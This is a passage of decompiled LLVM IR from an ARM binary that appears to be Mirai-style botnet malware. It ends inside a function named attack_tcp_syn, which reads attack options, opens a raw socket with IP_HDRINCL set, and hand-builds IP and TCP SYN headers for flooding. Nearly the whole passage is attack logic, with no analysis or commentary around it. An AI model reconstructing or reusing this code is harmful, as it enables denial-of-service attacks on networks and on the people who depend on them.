  %v2_af20 = inttoptr i32 %v1_af18 to i16*
  %v3_af20 = call i32 @rand_str(i16* %v2_af20, i32 %v6_aa14)
  store i32 %v3_af20, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ada0

dec_label_pc_af28:                                ; preds = %dec_label_pc_aa74
  store i32 %v3_aa64, i32* %r0.global-to-local, align 4
  %v1_af2c = call i32 @__GI___libc_close(i32 %v3_aa64)
  store i32 %v1_af2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_af30

dec_label_pc_af30:                                ; preds = %entry, %dec_label_pc_af28
  %v1_af38 = phi i32 [ %v3_aa64, %entry ], [ %v1_af2c, %dec_label_pc_af28 ]
  store i32 %v18_a864, i32* %sb.global-to-local, align 4
  store i32 %v24_a864, i32* %fp.global-to-local, align 4
  store i32 %v27_a864, i32* %lr.global-to-local, align 4
  ret i32 %v1_af38

dec_label_pc_af3c:                                ; preds = %dec_label_pc_aa9c
  store i32 %v6_aa14, i32* %r0.global-to-local, align 4
  %v1_af44 = add i32 %v6_aa14, 20
  store i32 %v1_af44, i32* @sb, align 4
  %v3_af48 = mul i32 %v6_aa14, 65536
  store i32 %v3_af48, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_acf8

; uselistorder directives
  uselistorder i32 %v0_aedc, { 1, 0 }
  uselistorder i32 %v0_aec8, { 1, 0 }
  uselistorder i32 %v0_aeb4, { 1, 0 }
  uselistorder i32 %v5_ae88, { 1, 0 }
  uselistorder i32 %v3_ae38, { 2, 1, 3, 0 }
  uselistorder i32 %v1_ae14, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_ade0, { 1, 0 }
  uselistorder i32 %v4_add0, { 1, 0 }
  uselistorder i1 %v7_ad48, { 2, 1, 0 }
  uselistorder i1 %v2_af0c, { 2, 3, 1, 0 }
  uselistorder i1 %v9_aea8, { 2, 3, 1, 0 }
  uselistorder i32 %stack_var_-140.0, { 1, 0 }
  uselistorder i32 %v1_acdc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_acb0, { 1, 0 }
  uselistorder i32 %v1_ab64, { 1, 2, 0 }
  uselistorder i32 %v1_ab60, { 2, 1, 0 }
  uselistorder i32 %v1_ab5c, { 2, 0, 1 }
  uselistorder i32 %v1_ab58, { 2, 0, 1 }
  uselistorder i32 %v1_ab54, { 2, 0, 1 }
  uselistorder i32 %v1_ab2c, { 1, 0 }
  uselistorder i32 %v3_aad4, { 1, 0 }
  uselistorder i32 %v3_aaac, { 1, 2, 0, 3 }
  uselistorder i32 %v0_aaa4, { 1, 0, 2 }
  uselistorder i32 %v0_aaa0, { 1, 0, 2 }
  uselistorder i32 %v0_aa9c, { 1, 0, 3, 2 }
  uselistorder i1 %v7_aa94, { 1, 0 }
  uselistorder i1 %v7_aa68, { 1, 0 }
  uselistorder i32 %v3_aa64, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_aa50, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_aa3c, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_aa14, { 0, 10, 9, 8, 7, 2, 4, 3, 6, 5, 1 }
  uselistorder i32 %v6_a96c, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v6_a950, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v1_a900, { 1, 2, 0 }
  uselistorder i32 %v5_a8f4, { 0, 2, 1 }
  uselistorder i32 %v5_a8bc, { 0, 2, 1 }
  uselistorder i32 %v2_a880, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 36, 35, 38, 37, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 6, 4, 7, 5, 8, 9, 10, 12, 11, 14, 13, 15, 17, 16, 18, 19, 20, 22, 21, 24, 23, 25, 26, 27, 31, 28, 29, 30, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_af30, { 1, 0 }
  uselistorder label %dec_label_pc_af18, { 1, 0 }
  uselistorder label %dec_label_pc_ada0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ad1c, { 1, 0 }
  uselistorder label %dec_label_pc_ad0c, { 1, 0, 2 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_tcp_syn(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_af5c = load i32, i32* @r4, align 4
  %v24_af5c = load i32, i32* @fp, align 4
  %v27_af5c = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_af78 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_af7c = load i32, i32* @r5, align 4
  store i32 %v0_af7c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_af78, i32* @sb, align 4
  %v0_af8c = load i32, i32* @r4, align 4
  store i32 %v0_af8c, i32* %r0.global-to-local, align 4
  %v5_af90 = inttoptr i32 %v0_af7c to i32*
  %v6_af90 = call i32 @attack_get_opt_int(i32 %v0_af8c, i32* %v5_af90, i32 2, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_afa8 = load i32, i32* @r5, align 4
  store i32 %v0_afa8, i32* %r1.global-to-local, align 4
  %v0_afac = load i32, i32* @r4, align 4
  store i32 %v0_afac, i32* %r0.global-to-local, align 4
  %v5_afb0 = trunc i32 %v6_af90 to i8
  %v6_afb4 = inttoptr i32 %v0_afa8 to i32*
  %v7_afb4 = call i32 @attack_get_opt_int(i32 %v0_afac, i32* %v6_afb4, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v6_af90)
  %v0_afb8 = load i32, i32* @r5, align 4
  store i32 %v0_afb8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_afc8 = load i32, i32* @r4, align 4
  store i32 %v0_afc8, i32* %r0.global-to-local, align 4
  %v5_afcc = inttoptr i32 %v0_afb8 to i32*
  %v6_afcc = call i32 @attack_get_opt_int(i32 %v0_afc8, i32* %v5_afcc, i32 4, i32 64, i32 %v7_afb4)
  %v1_afd4 = urem i32 %v6_afcc, 256
  %v0_afd8 = load i32, i32* @r5, align 4
  store i32 %v0_afd8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_afe4 = load i32, i32* @r4, align 4
  store i32 %v0_afe4, i32* %r0.global-to-local, align 4
  %v6_afec = inttoptr i32 %v0_afd8 to i32*
  %v7_afec = call i32 @attack_get_opt_int(i32 %v0_afe4, i32* %v6_afec, i32 5, i32 1, i32 %v1_afd4)
  %v1_aff8 = urem i32 %v7_afec, 256
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_b004 = load i32, i32* @r5, align 4
  store i32 %v0_b004, i32* %r1.global-to-local, align 4
  %v0_b008 = load i32, i32* @r4, align 4
  store i32 %v0_b008, i32* %r0.global-to-local, align 4
  %v5_b010 = inttoptr i32 %v0_b004 to i32*
  %v6_b010 = call i32 @attack_get_opt_int(i32 %v0_b008, i32* %v5_b010, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v1_aff8)
  %v0_b018 = load i32, i32* @r5, align 4
  store i32 %v0_b018, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_b010, i32* %fp.global-to-local, align 4
  %v0_b028 = load i32, i32* @r4, align 4
  store i32 %v0_b028, i32* %r0.global-to-local, align 4
  %v5_b02c = inttoptr i32 %v0_b018 to i32*
  %v6_b02c = call i32 @attack_get_opt_int(i32 %v0_b028, i32* %v5_b02c, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 ptrtoint (i32* @0 to i32))
  %v0_b034 = load i32, i32* @r5, align 4
  store i32 %v0_b034, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v6_b02c, i32* @r6, align 4
  %v0_b044 = load i32, i32* @r4, align 4
  store i32 %v0_b044, i32* %r0.global-to-local, align 4
  %v5_b048 = inttoptr i32 %v0_b034 to i32*
  %v6_b048 = call i32 @attack_get_opt_int(i32 %v0_b044, i32* %v5_b048, i32 17, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 ptrtoint (i32* @0 to i32))
  %v0_b04c = load i32, i32* @r5, align 4
  store i32 %v0_b04c, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b05c = load i32, i32* @r4, align 4
  store i32 %v0_b05c, i32* %r0.global-to-local, align 4
  %v5_b060 = inttoptr i32 %v0_b04c to i32*
  %v6_b060 = call i32 @attack_get_opt_int(i32 %v0_b05c, i32* %v5_b060, i32 18, i32 0, i32 %v6_b048)
  %v0_b064 = load i32, i32* @r5, align 4
  store i32 %v0_b064, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b074 = load i32, i32* @r4, align 4
  store i32 %v0_b074, i32* %r0.global-to-local, align 4
  %v5_b078 = inttoptr i32 %v0_b064 to i32*
  %v6_b078 = call i32 @attack_get_opt_int(i32 %v0_b074, i32* %v5_b078, i32 11, i32 0, i32 %v6_b060)
  %v0_b07c = load i32, i32* @r5, align 4
  store i32 %v0_b07c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b08c = load i32, i32* @r4, align 4
  store i32 %v0_b08c, i32* %r0.global-to-local, align 4
  %v5_b090 = inttoptr i32 %v0_b07c to i32*
  %v6_b090 = call i32 @attack_get_opt_int(i32 %v0_b08c, i32* %v5_b090, i32 12, i32 0, i32 %v6_b078)
  %v0_b094 = load i32, i32* @r5, align 4
  store i32 %v0_b094, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b0a4 = load i32, i32* @r4, align 4
  store i32 %v0_b0a4, i32* %r0.global-to-local, align 4
  %v5_b0a8 = inttoptr i32 %v0_b094 to i32*
  %v6_b0a8 = call i32 @attack_get_opt_int(i32 %v0_b0a4, i32* %v5_b0a8, i32 13, i32 0, i32 %v6_b090)
  %v0_b0ac = load i32, i32* @r5, align 4
  store i32 %v0_b0ac, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b0bc = load i32, i32* @r4, align 4
  store i32 %v0_b0bc, i32* %r0.global-to-local, align 4
  %v5_b0c0 = inttoptr i32 %v0_b0ac to i32*
  %v6_b0c0 = call i32 @attack_get_opt_int(i32 %v0_b0bc, i32* %v5_b0c0, i32 14, i32 0, i32 %v6_b0a8)
  %v0_b0c4 = load i32, i32* @r5, align 4
  store i32 %v0_b0c4, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b0d4 = load i32, i32* @r4, align 4
  store i32 %v0_b0d4, i32* %r0.global-to-local, align 4
  %v5_b0d8 = inttoptr i32 %v0_b0c4 to i32*
  %v6_b0d8 = call i32 @attack_get_opt_int(i32 %v0_b0d4, i32* %v5_b0d8, i32 15, i32 1, i32 %v6_b0c0)
  %v0_b0dc = load i32, i32* @r5, align 4
  store i32 %v0_b0dc, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b0ec = load i32, i32* @r4, align 4
  store i32 %v0_b0ec, i32* %r0.global-to-local, align 4
  %v5_b0f0 = inttoptr i32 %v0_b0dc to i32*
  %v6_b0f0 = call i32 @attack_get_opt_int(i32 %v0_b0ec, i32* %v5_b0f0, i32 16, i32 0, i32 %v6_b0d8)
  %v2_b0fc = load i32, i32* @global_var_24f78.59, align 4
  store i32 %v2_b0fc, i32* %r3.global-to-local, align 4
  %v0_b100 = load i32, i32* @r5, align 4
  store i32 %v0_b100, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_b108 = load i32, i32* @r4, align 4
  store i32 %v0_b108, i32* %r0.global-to-local, align 4
  %v5_b10c = inttoptr i32 %v0_b100 to i32*
  %v6_b10c = call i32 @attack_get_opt_ip(i32 %v0_b108, i32* %v5_b10c, i32 25, i32 %v2_b0fc, i32 %v6_b0f0)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_b120 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_b120, i32* %r0.global-to-local, align 4
  %v7_b124 = icmp eq i32 %v3_b120, -1
  store i1 %v7_b124, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b120, i32* @sl, align 4
  br i1 %v7_b124, label %dec_label_pc_b5f8, label %dec_label_pc_b130

dec_label_pc_b130:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b138 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b138, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b14c = call i32 @__GI_setsockopt(i32 %v3_b120, i32 0, i32 3, i32 %v6_b138, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_b14c, i32* %r0.global-to-local, align 4
  %v7_b150 = icmp eq i32 %v5_b14c, -1
  store i1 %v7_b150, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b150, label %dec_label_pc_b5f0, label %dec_label_pc_b158

dec_label_pc_b158:                                ; preds = %dec_label_pc_b130
  %v3_b160 = mul i32 %v7_afb4, 65536
  store i32 %v3_b160, i32* %r0.global-to-local, align 4
  %v0_b164 = load i32, i32* %fp.global-to-local, align 4
  %v3_b164 = mul i32 %v0_b164, 65536
  store i32 %v3_b164, i32* %r4.global-to-local, align 4
  %v0_b168 = load i32, i32* @r6, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 %v6_b078, i32* %r2.global-to-local, align 4
  %v3_b174 = urem i32 %v7_afb4, 65536
  store i32 %v3_b174, i32* %r3.global-to-local, align 4
  %v3_b178 = urem i32 %v0_b164, 65536
  %v3_b17c = urem i32 %v0_b168, 65536
  store i32 %v3_b17c, i32* %r1.global-to-local, align 4
  %v0_b180 = load i32, i32* @r7, align 4
  %v2_b180 = icmp eq i32 %v0_b180, 0
  store i1 %v2_b180, i1* %cpsr_z.global-to-local, align 1
  %v1_b190 = urem i32 %v6_b078, 256
  store i32 %v1_b190, i32* @fp, align 4
  br i1 %v2_b180, label %dec_label_pc_b3e4.preheader, label %dec_label_pc_b198

dec_label_pc_b198:                                ; preds = %dec_label_pc_b158
  %tmp52 = mul i32 %v6_b048, 256
  %v3_b1b0 = and i32 %tmp52, 65280
  %tmp53 = udiv i32 %v7_afb4, 256
  %v3_b1b4 = urem i32 %tmp53, 256
  %tmp54 = udiv i32 %v6_b048, 256
  %v4_b1bc = urem i32 %tmp54, 256
  %v5_b1bc = or i32 %v4_b1bc, %v3_b1b0
  store i32 %v5_b1bc, i32* @lr, align 4
  %v1_b1b8 = mul i32 %v7_afb4, 256
  %v4_b1c0 = and i32 %v1_b1b8, 65280
  %v5_b1c0 = or i32 %v4_b1c0, %v3_b1b4
  %tmp55 = mul i32 %v0_b164, 256
  %v3_b1cc = and i32 %tmp55, 65280
  %tmp56 = mul i32 %v0_b168, 256
  %v3_b1d0 = and i32 %tmp56, 65280
  %v1_b1d4 = urem i32 %v6_b078, 2
  %v1_b1d8 = urem i32 %v6_b090, 2
  %tmp57 = udiv i32 %v0_b164, 256
  %v4_b1dc = urem i32 %tmp57, 256
  %v5_b1dc = or i32 %v4_b1dc, %v3_b1cc
  store i32 %v5_b1dc, i32* @r6, align 4
  %tmp58 = udiv i32 %v0_b168, 256
  %v4_b1e0 = urem i32 %tmp58, 256
  %v5_b1e0 = or i32 %v4_b1e0, %v3_b1d0
  store i32 %v5_b1e0, i32* @r5, align 4
  %v1_b1fc = urem i32 %v6_b0a8, 2
  store i32 %v1_b1fc, i32* %r2.global-to-local, align 4
  %v1_b200 = urem i32 %v6_b0c0, 2
  store i32 %v1_b200, i32* %r3.global-to-local, align 4
  %v1_b204 = urem i32 %v6_b0d8, 2
  store i32 %v1_b204, i32* %r0.global-to-local, align 4
  %v1_b208 = urem i32 %v6_b0f0, 2
  store i32 %v1_b208, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext = mul nuw i32 %v5_b1c0, 65536
  %v4_b290 = sdiv i32 %sext, 65536
  %tmp = sub nsw i32 0, %v1_b1d8
  %v4_b2f4 = and i32 %tmp, 16
  %tmp62 = sub nsw i32 0, %v1_b1fc
  %v4_b308 = and i32 %tmp62, 8
  %tmp63 = sub nsw i32 0, %v1_b200
  %v4_b320 = and i32 %tmp63, 4
  %tmp64 = sub nsw i32 0, %v1_b204
  %v3_b334 = and i32 %tmp64, 2
  %v1_b284 = trunc i32 %v6_afcc to i8
  br label %dec_label_pc_b228

dec_label_pc_b228:                                ; preds = %bb61, %dec_label_pc_b198
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_b230 = call i32 @calloc(i32 128, i32 1)
  store i32 %v2_b230, i32* %r0.global-to-local, align 4
  %v3_b234 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b234, i32* %r2.global-to-local, align 4
  %v1_b238 = load i32, i32* @sb, align 4
  %v2_b238 = load i32, i32* @r4, align 4
  %v5_b238 = mul i32 %v2_b238, 4
  %v6_b238 = add i32 %v5_b238, %v1_b238
  %v7_b238 = inttoptr i32 %v6_b238 to i32*
  store i32 %v2_b230, i32* %v7_b238, align 4
  %v0_b23c = load i32, i32* %r2.global-to-local, align 4
  %v3_b23c = mul i32 %v0_b23c, 32
  store i32 %v3_b23c, i32* %r3.global-to-local, align 4
  %v0_b240 = load i32, i32* @sb, align 4
  %v4_b240 = mul i32 %v0_b23c, 4
  %v5_b240 = add i32 %v0_b240, %v4_b240
  %v6_b240 = inttoptr i32 %v5_b240 to i32*
  %v7_b240 = load i32, i32* %v6_b240, align 4
  store i32 %v7_b240, i32* %r4.global-to-local, align 4
  %v5_b244 = mul i32 %v0_b23c, 24
  store i32 %v5_b244, i32* %r3.global-to-local, align 4
  %v1_b248 = load i32, i32* @r8, align 4
  %v2_b248 = add i32 %v1_b248, %v5_b244
  store i32 %v2_b248, i32* %r0.global-to-local, align 4
  %v1_b24c = inttoptr i32 %v7_b240 to i8*
  %v2_b24c = load i8, i8* %v1_b24c, align 1
  %tmp65 = urem i8 %v2_b24c, 16
  %v1_b250 = zext i8 %tmp65 to i32
  %v1_b254 = or i32 %v1_b250, 64
  store i32 %v1_b254, i32* %r3.global-to-local, align 4
  %v1_b258 = trunc i32 %v1_b254 to i8
  store i8 %v1_b258, i8* %v1_b24c, align 1
  %v0_b25c = load i32, i32* %r4.global-to-local, align 4
  %v1_b25c = inttoptr i32 %v0_b25c to i8*
  %v2_b25c = load i8, i8* %v1_b25c, align 1
  %v1_b260 = and i8 %v2_b25c, -16
  %v1_b264 = or i8 %v1_b260, 5
  store i32 %v1_aff8, i32* %r3.global-to-local, align 4
  store i8 %v1_b264, i8* %v1_b25c, align 1
  %v2_b274 = load i32, i32* %r4.global-to-local, align 4
  %v3_b274 = add i32 %v2_b274, 1
  %v4_b274 = inttoptr i32 %v3_b274 to i8*
  store i8 %v5_afb0, i8* %v4_b274, align 1
  store i32 %v1_afd4, i32* %r2.global-to-local, align 4
  %v0_b27c = load i32, i32* %r3.global-to-local, align 4
  %v2_b27c = icmp eq i32 %v0_b27c, 0
  store i1 %v2_b27c, i1* %cpsr_z.global-to-local, align 1
  store i32 15360, i32* %r3.global-to-local, align 4
  %v2_b284 = load i32, i32* %r4.global-to-local, align 4
  %v3_b284 = add i32 %v2_b284, 8
  %v4_b284 = inttoptr i32 %v3_b284 to i8*
  store i8 %v1_b284, i8* %v4_b284, align 1
  %v0_b288 = load i32, i32* %r3.global-to-local, align 4
  %v1_b288 = trunc i32 %v0_b288 to i16
  %v2_b288 = load i32, i32* %r4.global-to-local, align 4
  %v3_b288 = add i32 %v2_b288, 2
  %v4_b288 = inttoptr i32 %v3_b288 to i16*
  store i16 %v1_b288, i16* %v4_b288, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v4_b290, i32* %r1.global-to-local, align 4
  %v0_b294 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b294, label %bb59, label %bb

bb:                                               ; preds = %dec_label_pc_b228
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_b228, %bb
  %v2_b298 = load i32, i32* %r4.global-to-local, align 4
  %v3_b298 = add i32 %v2_b298, 9
  %v4_b298 = inttoptr i32 %v3_b298 to i8*
  store i8 6, i8* %v4_b298, align 1
  %v0_b29c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b29c, label %bb61, label %bb60

bb60:                                             ; preds = %bb59
  %v1_b29c = load i32, i32* %r2.global-to-local, align 4
  %v2_b29c = trunc i32 %v1_b29c to i16
  %v3_b29c = load i32, i32* %r4.global-to-local, align 4
  %v4_b29c = add i32 %v3_b29c, 6
  %v5_b29c = inttoptr i32 %v4_b29c to i16*
  store i16 %v2_b29c, i16* %v5_b29c, align 2
  br label %bb61

bb61:                                             ; preds = %bb59, %bb60
  store i32 %v6_b10c, i32* %r2.global-to-local, align 4
  %v1_b2a4 = load i32, i32* %r4.global-to-local, align 4
  %v2_b2a4 = add i32 %v1_b2a4, 12
  %v3_b2a4 = inttoptr i32 %v2_b2a4 to i32*
  store i32 %v6_b10c, i32* %v3_b2a4, align 4
  %v0_b2a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_b2a8 = add i32 %v0_b2a8, 16
  %v2_b2a8 = inttoptr i32 %v1_b2a8 to i32*
  %v3_b2a8 = load i32, i32* %v2_b2a8, align 4
  store i32 %v3_b2a8, i32* %r3.global-to-local, align 4
  %v0_b2ac = load i32, i32* %r1.global-to-local, align 4
  %v1_b2ac = trunc i32 %v0_b2ac to i16
  %v2_b2ac = load i32, i32* %r4.global-to-local, align 4
  %v3_b2ac = add i32 %v2_b2ac, 4
  %v4_b2ac = inttoptr i32 %v3_b2ac to i16*
  store i16 %v1_b2ac, i16* %v4_b2ac, align 2
  %v0_b2b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b2b0 = load i32, i32* %r4.global-to-local, align 4
  %v2_b2b0 = add i32 %v1_b2b0, 16
  %v3_b2b0 = inttoptr i32 %v2_b2b0 to i32*
  store i32 %v0_b2b0, i32* %v3_b2b0, align 4
  %v0_b2b4 = load i32, i32* @r6, align 4
  %v1_b2b4 = trunc i32 %v0_b2b4 to i16
  %v2_b2b4 = load i32, i32* %r4.global-to-local, align 4
  %v3_b2b4 = add i32 %v2_b2b4, 20
  %v4_b2b4 = inttoptr i32 %v3_b2b4 to i16*
  store i16 %v1_b2b4, i16* %v4_b2b4, align 2
  %v0_b2b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_b2b8 = add i32 %v0_b2b8, 20
  store i32 %v1_b2b8, i32* %r1.global-to-local, align 4
  %v1_b2bc = add i32 %v0_b2b8, 32
  %v2_b2bc = inttoptr i32 %v1_b2bc to i8*
  %v3_b2bc = load i8, i8* %v2_b2bc, align 1
  %v4_b2bc = zext i8 %v3_b2bc to i32
  store i32 %v4_b2bc, i32* %r3.global-to-local, align 4
  %v1_b2c0 = add i32 %v0_b2b8, 33
  %v2_b2c0 = inttoptr i32 %v1_b2c0 to i8*
  %v3_b2c0 = load i8, i8* %v2_b2c0, align 1
  %v4_b2c0 = zext i8 %v3_b2c0 to i32
  store i32 %v1_b1d4, i32* %r0.global-to-local, align 4
  %v1_b2c8 = urem i8 %v3_b2bc, 16
  %v1_b2cc = or i8 %v1_b2c8, -96
  %v1_b2d0 = and i32 %v4_b2c0, 223
  store i32 %v1_b2d0, i32* %r2.global-to-local, align 4
  store i8 %v1_b2cc, i8* %v2_b2bc, align 1
  %v0_b2d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_b2d8 = load i32, i32* %r0.global-to-local, align 4
  %v4_b2d8 = mul i32 %v1_b2d8, 32
  %v5_b2d8 = or i32 %v4_b2d8, %v0_b2d8
  store i32 %v5_b2d8, i32* %r2.global-to-local, align 4
  store i32 %v5_b1bc, i32* %r3.global-to-local, align 4
  %v1_b2e0 = trunc i32 %v5_b2d8 to i8
  %v2_b2e0 = load i32, i32* %r1.global-to-local, align 4
  %v3_b2e0 = add i32 %v2_b2e0, 13
  %v4_b2e0 = inttoptr i32 %v3_b2e0 to i8*
  store i8 %v1_b2e0, i8* %v4_b2e0, align 1
  %v0_b2e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b2e4 = load i32, i32* %r1.global-to-local, align 4
  %v2_b2e4 = add i32 %v1_b2e4, 4
  %v3_b2e4 = inttoptr i32 %v2_b2e4 to i32*
  store i32 %v0_b2e4, i32* %v3_b2e4, align 4
  %v0_b2e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b2e8 = add i32 %v0_b2e8, 13
  %v2_b2e8 = inttoptr i32 %v1_b2e8 to i8*
  %v3_b2e8 = load i8, i8* %v2_b2e8, align 1
  %v4_b2e8 = zext i8 %v3_b2e8 to i32
  store i32 %v1_b1d8, i32* %r0.global-to-local, align 4
  %v1_b2f0 = and i32 %v4_b2e8, 239
  %v5_b2f4 = or i32 %v1_b2f0, %v4_b2f4
  store i32 %v5_b2f4, i32* %r3.global-to-local, align 4
  %v1_b2f8 = trunc i32 %v5_b2f4 to i8
  store i8 %v1_b2f8, i8* %v2_b2e8, align 1
  %v0_b2fc = load i32, i32* %r1.global-to-local, align 4
  %v1_b2fc = add i32 %v0_b2fc, 13
  %v2_b2fc = inttoptr i32 %v1_b2fc to i8*
  %v3_b2fc = load i8, i8* %v2_b2fc, align 1
  %v4_b2fc = zext i8 %v3_b2fc to i32
  store i32 %v1_b1fc, i32* %r3.global-to-local, align 4
  %v1_b304 = and i32 %v4_b2fc, 247
  %v5_b308 = or i32 %v1_b304, %v4_b308
  store i32 %v5_b308, i32* %r2.global-to-local, align 4
  %v0_b30c = load i32, i32* @r5, align 4
  %v1_b30c = trunc i32 %v0_b30c to i16
  %v3_b30c = add i32 %v0_b2fc, 2
  %v4_b30c = inttoptr i32 %v3_b30c to i16*
  store i16 %v1_b30c, i16* %v4_b30c, align 2
  %v0_b310 = load i32, i32* %r2.global-to-local, align 4
  %v1_b310 = trunc i32 %v0_b310 to i8
  %v2_b310 = load i32, i32* %r1.global-to-local, align 4
  %v3_b310 = add i32 %v2_b310, 13
  %v4_b310 = inttoptr i32 %v3_b310 to i8*
  store i8 %v1_b310, i8* %v4_b310, align 1
  %v0_b314 = load i32, i32* %r1.global-to-local, align 4
  %v1_b314 = add i32 %v0_b314, 13
